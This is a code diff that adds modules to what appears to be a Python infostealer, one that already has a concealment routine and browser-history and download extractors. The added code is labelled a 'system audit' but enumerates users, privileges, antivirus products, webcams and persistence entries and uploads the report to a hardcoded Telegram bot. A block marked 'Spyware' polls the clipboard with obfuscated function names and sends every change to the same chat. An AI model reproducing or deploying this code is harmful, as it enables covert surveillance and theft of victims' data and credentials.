@@ -14,6 +14,364 @@ RES_FILE = os.path.join(BASE_DIR, "res.txt")
 SS_FILE = os.path.join(BASE_DIR, "ss.png")
 CREATE_NO_WINDOW = 0x08000000
 
+
+#======================================================================================================
+# SYSTEM INFORMATION ADVANCED
+
+
+import os, requests
+import platform
+import socket
+import subprocess
+import uuid
+import re
+from datetime import datetime
+
+OUTPUT_FILE = "system_audit_report.txt"
+
+
+# ====================== System Profiling ======================
+def system_profiling(logger):
+    logger.log("System Profiling", "Collecting basic system info...")
+    try:
+        os_type = platform.system()
+        os_release = platform.release()
+        os_version = platform.version()
+        arch = platform.machine()
+        hostname = socket.gethostname()
+        ip_addr = socket.gethostbyname(hostname)
+        mac_addr = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+        logger.log("OS", f"Type: {os_type}, Release: {os_release}, Version: {os_version}, Architecture: {arch}")
+        logger.log("Network", f"Hostname: {hostname}, IP: {ip_addr}, MAC: {mac_addr}")
+
+        if os_type == "Windows":
+            try:
+                domain_info = subprocess.check_output("wmic computersystem get domain", shell=True).decode().split()
+                domain_workgroup = domain_info[1] if len(domain_info) > 1 else "Unknown"
+            except:
+                domain_workgroup = "N/A"
+            logger.log("OS", f"Domain/Workgroup: {domain_workgroup}")
+
+            try:
+                patches = subprocess.check_output("wmic qfe get HotFixID,InstalledOn", shell=True).decode()
+                logger.log("OS", f"Patches:\n{patches.strip()}")
+            except:
+                logger.log("OS", "Patches: Unable to retrieve")
+        else:
+            logger.log("OS", "Domain/Workgroup: N/A (Non-Windows)")
+            logger.log("OS", "Patches: Manual check required (apt/yum etc.)")
+
+    except Exception as e:
+        logger.log("System Profiling", f"Error collecting system info: {e}")
+
+# ====================== Users & Identity ======================
+def users_identity(logger):
+    logger.log("Users & Identity", "Collecting users, groups, sessions...")
+    try:
+        if platform.system() == "Windows":
+            try:
+                local_users = subprocess.check_output("net user", shell=True).decode(errors='ignore')
+                logger.log("Local Users", local_users)
+            except:
+                logger.log("Local Users", "Unable to retrieve local users")
+
+            try:
+                admin_group = subprocess.check_output("net localgroup administrators", shell=True).decode(errors='ignore')
+                logger.log("Admin Group", admin_group)
+            except:
+                logger.log("Admin Group", "Unable to retrieve")
+
+            try:
+                sessions = subprocess.check_output("query user", shell=True).decode(errors='ignore')
+                logger.log("Active Sessions", sessions)
+            except:
+                logger.log("Active Sessions", "No active sessions or command missing")
+
+            try:
+                password_policy = subprocess.check_output("net accounts", shell=True).decode(errors='ignore')
+                logger.log("Password Policy", password_policy)
+            except:
+                logger.log("Password Policy", "Unable to retrieve")
+
+            try:
+                trusts = subprocess.check_output("nltest /domain_trusts", shell=True).decode(errors='ignore')
+                logger.log("Domain Trusts", trusts)
+            except:
+                logger.log("Domain Trusts", "nltest not found or not in domain environment")
+
+        else:  # Linux / Unix
+            try:
+                local_users = subprocess.check_output("cut -d: -f1 /etc/passwd", shell=True).decode()
+                logger.log("Local Users", local_users)
+                sessions = subprocess.check_output("who", shell=True).decode()
+                logger.log("Active Sessions", sessions)
+                sudo_users = subprocess.check_output("grep '^sudo' /etc/group", shell=True).decode()
+                logger.log("Sudo Users", sudo_users)
+            except:
+                logger.log("Users & Identity", "Limited info on non-Windows system")
+    except Exception as e:
+        logger.log("Users & Identity", f"Error: {e}")
+
+# ====================== Privileges & Access ======================
+def privileges_access(logger):
+    logger.log("Privileges & Access", "Collecting user privileges and ACLs...")
+    try:
+        if platform.system() == "Windows":
+            import ctypes
+            try:
+                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+                logger.log("Current User", f"Admin: {is_admin}")
+            except:
+                logger.log("Current User", "Unable to detect admin")
+
+            try:
+                token_privs = subprocess.check_output("whoami /priv", shell=True).decode(errors='ignore')
+                logger.log("Token Privileges", token_privs)
+            except:
+                logger.log("Token Privileges", "Unable to retrieve")
+
+            paths = [os.environ.get('SystemRoot', 'C:\\Windows'), "C:\\Program Files"]
+            for path in paths:
+                access_type = "Write Access" if os.access(path, os.W_OK) else "Read/Execute Only"
+                logger.log("ACL Check", f"{path}: {access_type}")
+
+        else:
+            uid_gid = f"UID: {os.getuid()}, GID: {os.getgid()}"
+            logger.log("UID/GID", uid_gid)
+            try:
+                sudo_cap = subprocess.check_output("sudo -l", shell=True).decode(errors='ignore')
+                logger.log("Sudo Capabilities", sudo_cap)
+            except:
+                logger.log("Sudo Capabilities", "Unable to retrieve")
+
+    except Exception as e:
+        logger.log("Privileges & Access", f"Error: {e}")
+
+# ====================== Software & Services ======================
+def software_services(logger):
+    logger.log("Software & Services", "Collecting installed software, processes, and services...")
+    try:
+        if platform.system() == "Windows":
+            try:
+                proc_list = subprocess.check_output("tasklist /V /FO CSV", shell=True).decode(errors='ignore').splitlines()[:21]
+                logger.log("Top Processes", "\n".join(proc_list))
+            except:
+                logger.log("Top Processes", "Unable to retrieve")
+
+            try:
+                services = subprocess.check_output("net start", shell=True).decode(errors='ignore')
+                logger.log("Active Services", services)
+            except:
+                logger.log("Active Services", "Unable to retrieve")
+
+            try:
+                av_cmd = "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName"
+                av_list = subprocess.check_output(av_cmd, shell=True).decode(errors='ignore')
+                logger.log("Security Products", av_list.strip())
+            except:
+                logger.log("Security Products", "Unable to retrieve")
+
+            # Remote tools
+            tools = ["TeamViewer", "AnyDesk", "VNC", "Radmin", "Putty", "WinSCP"]
+            try:
+                tasklist_all = subprocess.check_output("tasklist", shell=True).decode(errors='ignore')
+                found_tools = [t for t in tools if t.lower() in tasklist_all.lower()]
+                logger.log("Remote Admin Tools", ", ".join(found_tools) if found_tools else "None found")
+            except:
+                logger.log("Remote Admin Tools", "Unable to detect")
+
+        else:  # Linux
+            try:
+                processes = subprocess.check_output("ps aux | head -n 20", shell=True).decode()
+                logger.log("Top Processes", processes)
+                services = subprocess.check_output("systemctl list-units --type=service --state=running | head -n 20", shell=True).decode()
+                logger.log("Running Services", services)
+            except:
+                logger.log("Software & Services", "Unable to retrieve processes/services")
+
+    except Exception as e:
+        logger.log("Software & Services", f"Error: {e}")
+
+# ====================== Shared Resources ======================
+def shared_resources(logger):
+    logger.log("Shared Resources", "Checking SMB shares, printers, folders, and devices...")
+    try:
+        if platform.system() == "Windows":
+            try:
+                shares = subprocess.check_output("net share", shell=True).decode(errors='ignore')
+                logger.log("SMB Shares", shares)
+            except:
+                logger.log("SMB Shares", "Unable to retrieve")
+
+            try:
+                printers = subprocess.check_output("wmic printer get name,shared,sharename", shell=True).decode(errors='ignore')
+                logger.log("Printers", printers)
+            except:
+                logger.log("Printers", "Unable to retrieve")
+
+            paths = [os.path.join(os.environ.get('SystemDrive', 'C:'), 'Users'), os.environ.get('ProgramFiles', 'C:\\Program Files')]
+            for path in paths:
+                try:
+                    perms = subprocess.check_output(f'icacls "{path}"', shell=True).decode(errors='ignore')
+                    logger.log("Folder Permissions", f"{path}:\n{perms}")
+                except:
+                    logger.log("Folder Permissions", f"{path}: Unable to retrieve")
+            
+            # Peripherals
+            try:
+                usb = subprocess.check_output("wmic path Win32_USBHub get DeviceID,Status", shell=True).decode(errors='ignore')
+                logger.log("USB Devices", usb)
+            except:
+                logger.log("USB Devices", "Unable to detect")
+            try:
+                cams = subprocess.check_output("wmic path Win32_PnPEntity where \"Service='usbvideo'\" get caption", shell=True).decode(errors='ignore')
+                logger.log("Cameras/Webcams", cams.strip() if cams.strip() else "None found")
+            except:
+                logger.log("Cameras/Webcams", "Unable to detect")
+            try:
+                audio = subprocess.check_output("wmic path Win32_SoundDevice get caption,status", shell=True).decode(errors='ignore')
+                logger.log("Audio Devices", audio.strip() if audio.strip() else "None found")
+            except:
+                logger.log("Audio Devices", "Unable to detect")
+
+    except Exception as e:
+        logger.log("Shared Resources", f"Error: {e}")
+
+# ====================== Remote Execution & Service Audit ======================
+def remote_execution_service(logger):
+    logger.log("Remote Execution & Services", "Checking remote execution surfaces and service configs...")
+    try:
+        if platform.system() == "Windows":
+            try:
+                winrm_status = subprocess.check_output("sc query WinRM", shell=True).decode(errors='ignore')
+                logger.log("WinRM Status", winrm_status)
+            except:
+                logger.log("WinRM Status", "Unable to query")
+
+            try:
+                wmi_test = subprocess.check_output("wmic process get caption /format:list", shell=True).decode(errors='ignore')
+                logger.log("WMI Access", "Accessible")
+            except:
+                logger.log("WMI Access", "Restricted/Disabled")
+
+            # Services with potential misconfigurations
+            try:
+                services = subprocess.check_output('wmic service get name,pathname,startname', shell=True).decode(errors='ignore').splitlines()
+                for svc in services:
+                    parts = svc.split()
+                    if len(parts) > 1:
+                        path = parts[-2]  # approximate path
+                        if os.path.exists(path) and os.access(path, os.W_OK):
+                            logger.log("Service Path Risk", f"{svc} is writable")
+            except:
+                logger.log("Service Path Risk", "Unable to check")
+
+    except Exception as e:
+        logger.log("Remote Execution & Services", f"Error: {e}")
+
+# ====================== Persistence ======================
+def persistence(logger):
+    logger.log("Persistence Mechanisms", "Checking startup tasks, scheduled tasks, and services...")
+    try:
+        if platform.system() == "Windows":
+            # Startup registry
+            run_keys = [r"Software\Microsoft\Windows\CurrentVersion\Run",
+                        r"Software\Microsoft\Windows\CurrentVersion\RunOnce"]
+            import winreg
+            for key in run_keys:
+                for hive, hname in [(winreg.HKEY_CURRENT_USER,"HKCU"), (winreg.HKEY_LOCAL_MACHINE,"HKLM")]:
+                    try:
+                        with winreg.OpenKey(hive, key) as regkey:
+                            for i in range(winreg.QueryInfoKey(regkey)[1]):
+                                name, value, _ = winreg.EnumValue(regkey, i)
+                                logger.log("Startup Entry", f"[{hname}] {name} -> {value}")
+                    except:
+                        continue
+            # Scheduled tasks
+            try:
+                tasks = subprocess.check_output('schtasks /query /fo LIST /v | findstr /V /I "Microsoft"', shell=True).decode(errors='ignore')
+                tasks_list = [line for line in tasks.splitlines() if "TaskName:" in line][:10]
+                for t in tasks_list:
+                    logger.log("Scheduled Task", t.strip())
+            except:
+                logger.log("Scheduled Task", "Unable to retrieve")
+    except Exception as e:
+        logger.log("Persistence Mechanisms", f"Error: {e}")
+
+
+
+import urllib.request
+import mimetypes
+
+def send_to_telegram(file_path):
+    token = "8265205917:AAE4AtsWD52-kenwjYWrg6LtAZ25IEVOjVI"
+    chat_id = "6693150100"
+    url = f"https://api.telegram.org/bot{token}/sendDocument"
+    
+    try:
+        boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
+        with open(file_path, 'rb') as f:
+            file_content = f.read()
+        
+        # بناء جسم الطلب يدوياً (Multi-part form data)
+        data = []
+        data.append(f'--{boundary}'.encode())
+        data.append(f'Content-Disposition: form-data; name="chat_id"'.encode())
+        data.append(''.encode())
+        data.append(chat_id.encode())
+        
+        data.append(f'--{boundary}'.encode())
+        data.append(f'Content-Disposition: form-data; name="document"; filename="{os.path.basename(file_path)}"'.encode())
+        data.append(f'Content-Type: text/plain'.encode())
+        data.append(''.encode())
+        data.append(file_content)
+        
+        data.append(f'--{boundary}--'.encode())
+        data.append(''.encode())
+        
+        body = b'\r\n'.join(data)
+        req = urllib.request.Request(url, data=body)
+        req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
+        
+        with urllib.request.urlopen(req) as response:
+            if response.getcode() == 200:
+                print("[+] Report sent via Standard Library.")
+    except Exception as e:
+        print(f"[-] Standard Lib Error: {e}")
+
+class Logger:
+    def __init__(self, filename):
+        self.filename = filename
+        with open(self.filename, 'w', encoding='utf-8') as f:
+            f.write(f"System Audit Report - {datetime.now()}\n")
+            f.write("="*80 + "\n\n")
+
+    def log(self, category, info):
+        with open(self.filename, 'a', encoding='utf-8') as f:
+            f.write(f"[{category.upper()}] {info}\n")
+
+
+# ====================== Run Full Audit ======================
+def run_full_audit():
+    logger = Logger(OUTPUT_FILE)
+    system_profiling(logger)
+    users_identity(logger)
+    privileges_access(logger)
+    software_services(logger)
+    shared_resources(logger)
+    remote_execution_service(logger)
+    persistence(logger)
+    print(f"Audit completed. Results saved in {OUTPUT_FILE}")
+    send_to_telegram(OUTPUT_FILE)
+
+#if __name__ == "__main__":
+    #run_full_audit()
+
+
+
+
+#=========================================================================================================================================
+
 # --- الدوال (نفس دوالك تماماً) ---
 def send_to_telegram(file_path):
     try:
@@ -314,8 +672,8 @@ def start_concealment_protocol():
         else:
             print(f"[!] Target not found, skipping: {target}")
 
-if __name__ == "__main__":
-    start_concealment_protocol()
+#if __name__ == "__main__":
+    #start_concealment_protocol()
 
 
 import os
@@ -415,6 +773,68 @@ def extract_all_browser_history():
 
     return "HISTORY_PROCESS_COMPLETE"
         # ----------------------------------------------------------------
+# ========================================================================
+# Spyware Copy and Paste
+
+import time
+import pyperclip
+import threading
+import requests
+import gc 
+
+TELEGRAM_TOKEN_paste = "8552770579:AAFMfGYJ1WJmge_ofdi0p7VPiY92EKhPVGM"
+CHAT_ID_paste = "6693150100"
+
+_s_v_c = requests.Session()
+
+def _z9_p2_mQ(p_data):
+    _u_r_l = f"https://api.telegram.org/bot{TELEGRAM_TOKEN_paste}/sendMessage"
+    
+    if len(p_data) > 4000:
+        p_data = p_data[:4000] + "... [Truncated]"
+        
+    _p_l = {
+        "chat_id": CHAT_ID_paste,
+        "text": p_data
+    }
+    try:
+        _s_v_c.post(_u_r_l, data=_p_l, timeout=10)
+    except:
+        pass
+    finally:
+        # تنظيف البيانات المؤقتة بعد كل محاولة إرسال
+        del _p_l
+        gc.collect()
+
+def qx9_7pL0v():
+    _a = ""
+
+    while True:
+        try:
+            _b = pyperclip.paste()
+
+            if _b != _a:
+                _a = _b
+                
+                if _b and _b.strip():
+                    # إرسال المحتوى مع حماية من تشنج العملية
+                    _z9_p2_mQ(f"📋 Clip Update:\n\n{_b}")
+
+            # تفريغ المتغيرات الكبيرة دورياً
+            if len(_a) > 10000:
+                _a = _b[:100] # تقليص حجم الذاكرة المستخدمة للمقارنة
+
+        except Exception:
+            pass
+            
+        # وقت الانتظار لتقليل استهلاك المعالج
+        time.sleep(0.5)
+
+def k3M_x92Qa():
+    # تم الإبقاء على threading كما طلبت مع ضمان استقراره
+    _t = threading.Thread(target=qx9_7pL0v)
+    _t.daemon = False # جعل الخيط خلفياً لضمان إغلاقه مع البرنامج الرئيسي
+    _t.start()
 
 # =============================
 
@@ -529,6 +949,9 @@ def extract_all_browser_downloads():
 
     return "DOWNLOADS_PROCESSED_AND_CLEANED"
         # ----------------------------------------------------------------------
+
+
+
 # =============================
 if not os.path.exists(BASE_DIR):
     os.makedirs(BASE_DIR)
